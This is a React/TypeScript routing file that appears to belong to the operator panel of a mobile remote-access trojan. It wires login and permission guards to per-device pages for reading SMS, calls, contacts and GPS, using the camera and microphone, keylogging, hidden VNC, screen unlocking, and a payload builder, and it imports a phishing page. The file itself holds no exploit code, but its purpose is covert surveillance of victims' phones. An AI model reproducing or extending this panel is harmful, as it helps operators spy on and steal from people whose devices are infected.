import { Component, useEffect, useRef, useState } from 'react';
import { BrowserRouter, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { useAuthStore } from '@/store/auth';
import AppLayout from '@/components/layout/AppLayout';
import PhishingPage from '@/pages/Phishing';
import LoginPage from '@/pages/Login';
import SetupPage from '@/pages/Setup';
import DashboardPage from '@/pages/Dashboard';
import DevicesPage from '@/pages/Devices';
import DevicePage from '@/pages/Device';
import DeviceInfoPage from '@/pages/device/DeviceInfo';
import SmsPage from '@/pages/device/Sms';
import CallsPage from '@/pages/device/Calls';
import ContactsPage from '@/pages/device/Contacts';
import GpsPage from '@/pages/device/Gps';
import CameraPage from '@/pages/device/Camera';
import MicPage from '@/pages/device/Mic';
import FilesPage from '@/pages/device/Files';
import WifiPage from '@/pages/device/Wifi';
import ClipboardPage from '@/pages/device/Clipboard';
import NotificationsPage from '@/pages/device/Notifications';
import PermissionsPage from '@/pages/device/Permissions';
import AppsPage from '@/pages/device/Apps';
import FasonPage from '@/pages/device/Fason';
import HvncPage from '@/pages/device/Hvnc';
import InspectorPage from '@/pages/device/Inspector';
import KeyloggerPage from '@/pages/device/Keylogger';
import UnlockPage from '@/pages/device/Unlock';
import DownloadsPage from '@/pages/device/Downloads';
import BuilderPage from '@/pages/Builder';
import SettingsPage from '@/pages/Settings';
import LogsPage from '@/pages/Logs';
import UsersPage from '@/pages/Users';
import { AlertCircle, RefreshCw } from 'lucide-react';
import { Button } from '@/components/ui/button';
import type { Permission } from '@/types';

class ErrorBoundary extends Component<{ children: React.ReactNode }, { hasError: boolean; error: Error | null }> {
  constructor(props: { children: React.ReactNode }) { super(props); this.state = { hasError: false, error: null }; }
  static getDerivedStateFromError(error: Error) { return { hasError: true, error }; }
  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen flex items-center justify-center bg-background p-4">
          <div className="max-w-md w-full text-center space-y-4">
            <div className="h-16 w-16 mx-auto rounded-2xl bg-destructive/10 flex items-center justify-center">
              <AlertCircle className="h-8 w-8 text-destructive" />
            </div>
            <h2 className="text-xl font-semibold">Something went wrong</h2>
            <p className="text-sm text-muted-foreground">Something went wrong. Refresh the page to retry.</p>
            {this.state.error && import.meta.env.DEV && (
              <pre className="text-xs text-muted-foreground bg-muted p-3 rounded-lg overflow-auto max-h-32 text-left">
                {this.state.error.message}
              </pre>
            )}
            <Button onClick={() => window.location.reload()} className="gap-2">
              <RefreshCw className="h-4 w-4" /> Reload Page
            </Button>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}

function LoadingSpinner() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-background">
      <div className="flex flex-col items-center gap-3">
        <RefreshCw className="h-6 w-6 animate-spin text-primary" />
        <p className="text-sm text-muted-foreground">Loading...</p>
      </div>
    </div>
  );
}

let authChecked = false;
function AuthInitializer({ children }: { children: React.ReactNode }) {
  const { isChecking, checkAuth } = useAuthStore();
  const hasRun = useRef(false);
  const [setupNeeded, setSetupNeeded] = useState<boolean | null>(null);

  useEffect(() => {
    if (hasRun.current) return;
    hasRun.current = true;

    axios.get('/api/setup/status')
      .then(res => {
        if (res.data?.data?.complete === false) {
          setSetupNeeded(true);
        } else {
          setSetupNeeded(false);
          if (!authChecked) {
            authChecked = true;
            checkAuth();
          }
        }
      })
      .catch(() => {
        setSetupNeeded(false);
        if (!authChecked) {
          authChecked = true;
          checkAuth();
        }
      });
  }, [checkAuth]);

  if (setupNeeded === null) return <LoadingSpinner />;
  if (setupNeeded) return <Navigate to="/setup" replace />;

  if (isChecking && !authChecked) return <LoadingSpinner />;
  return <>{children}</>;
}

function SetupRoute({ children }: { children: React.ReactNode }) {
  const [status, setStatus] = useState<boolean | null>(null);

  useEffect(() => {
    axios.get('/api/setup/status')
      .then(res => setStatus(res.data?.data?.complete ?? false))
      .catch(() => setStatus(false));
  }, []);

  if (status === null) return <LoadingSpinner />;
  if (status) return <Navigate to="/login" replace />;
  return <>{children}</>;
}

function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { isAuthenticated, isChecking } = useAuthStore();
  if (isChecking) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" replace />;
  return <>{children}</>;
}

function PublicRoute({ children }: { children: React.ReactNode }) {
  const { isAuthenticated, isChecking } = useAuthStore();
  if (isChecking) return <LoadingSpinner />;
  if (isAuthenticated) return <Navigate to="/" replace />;
  return <>{children}</>;
}

function PermissionRoute({ permission, children }: { permission: Permission; children: React.ReactNode }) {
  const { isAuthenticated, isChecking, hasPermission } = useAuthStore();
  if (isChecking) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" replace />;
  if (!hasPermission(permission)) return <Navigate to="/" replace />;
  return <>{children}</>;
}

function AuthEventListener() {
  const navigate = useNavigate();
  const { logout } = useAuthStore();
  useEffect(() => {
    const handler = async () => {
      await logout();
      navigate('/login', { replace: true });
    };
    window.addEventListener('auth:unauthorized', handler);
    return () => window.removeEventListener('auth:unauthorized', handler);
  }, [logout, navigate]);
  return null;
}

function NotFoundPage() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-background p-4">
      <div className="text-center space-y-4">
        <h1 className="text-6xl font-bold text-primary">404</h1>
        <h2 className="text-xl font-semibold">Page Not Found</h2>
        <p className="text-muted-foreground">The page you are looking for does not exist.</p>
        <Button onClick={() => window.location.href = '/'}>Go to Dashboard</Button>
      </div>
    </div>
  );
}

export default function App() {
  return (
    <ErrorBoundary>
      <BrowserRouter>
        <AuthEventListener />
        <Routes>
          <Route path="/setup" element={<SetupRoute><SetupPage /></SetupRoute>} />
          <Route path="/*" element={
            <AuthInitializer>
              <Routes>
                <Route path="/login" element={<PublicRoute><LoginPage /></PublicRoute>} />
                <Route path="/" element={<ProtectedRoute><AppLayout /></ProtectedRoute>}>
                  <Route index element={<DashboardPage />} />
                  <Route path="devices" element={<DevicesPage />} />
                  <Route path="users" element={<PermissionRoute permission="users:manage"><UsersPage /></PermissionRoute>} />
                  <Route path="builder" element={<PermissionRoute permission="builder:access"><BuilderPage /></PermissionRoute>} />
                  <Route path="settings" element={<SettingsPage />} />
                  <Route path="logs" element={<PermissionRoute permission="logs:view"><LogsPage /></PermissionRoute>} />
                  <Route path="device/:id" element={<DevicePage />}>
                    <Route path="info" element={<DeviceInfoPage />} />
                    <Route path="sms" element={<PermissionRoute permission="device:sms"><SmsPage /></PermissionRoute>} />
                    <Route path="calls" element={<PermissionRoute permission="device:calls"><CallsPage /></PermissionRoute>} />
                    <Route path="contacts" element={<PermissionRoute permission="device:contacts"><ContactsPage /></PermissionRoute>} />
                    <Route path="gps" element={<PermissionRoute permission="device:gps"><GpsPage /></PermissionRoute>} />
                    <Route path="camera" element={<PermissionRoute permission="device:camera"><CameraPage /></PermissionRoute>} />
                    <Route path="mic" element={<PermissionRoute permission="device:mic"><MicPage /></PermissionRoute>} />
                    <Route path="files" element={<PermissionRoute permission="device:files"><FilesPage /></PermissionRoute>} />
                    <Route path="wifi" element={<PermissionRoute permission="device:wifi"><WifiPage /></PermissionRoute>} />
                    <Route path="clipboard" element={<PermissionRoute permission="device:clipboard"><ClipboardPage /></PermissionRoute>} />
                    <Route path="notifications" element={<PermissionRoute permission="device:notifications"><NotificationsPage /></PermissionRoute>} />
                    <Route path="permissions" element={<PermissionRoute permission="device:permissions"><PermissionsPage /></PermissionRoute>} />
                    <Route path="apps" element={<PermissionRoute permission="device:apps"><AppsPage /></PermissionRoute>} />
                    <Route path="fason" element={<PermissionRoute permission="device:fason"><FasonPage /></PermissionRoute>} />
                    <Route path="hvnc" element={<PermissionRoute permission="device:hvnc"><HvncPage /></PermissionRoute>} />
                    <Route path="inspector" element={<PermissionRoute permission="device:inspector"><InspectorPage /></PermissionRoute>} />
                    <Route path="keylogger" element={<PermissionRoute permission="device:keylogger"><KeyloggerPage /></PermissionRoute>} />
                    <Route path="unlock" element={<PermissionRoute permission="device:unlock"><UnlockPage /></PermissionRoute>} />
                    <Route path="downloads" element={<PermissionRoute permission="files:download"><DownloadsPage /></PermissionRoute>} />
                    <Route index element={<Navigate to="info" replace />} />
                  </Route>
                </Route>
                <Route path="*" element={<NotFoundPage />} />
              </Routes>
            </AuthInitializer>
          } />
        </Routes>
      </BrowserRouter>
    </ErrorBoundary>
  );
}
